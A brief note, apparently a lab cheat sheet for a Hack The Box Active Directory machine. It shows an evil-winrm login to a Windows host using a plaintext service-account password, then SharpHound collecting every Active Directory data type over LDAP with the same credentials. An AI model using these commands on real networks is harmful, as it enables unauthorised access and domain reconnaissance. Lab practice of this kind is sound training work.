Access a windows machine with evil win-rm:
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -s <path to sharphound.exe>
```

Download files with sharphound on a compromised windows machine with evil-winrm.

```
.\SharpHound.exe --collectionmethods all --domain htb.local --ldapusername svc-alfresco --ldappassword s3rvice
```
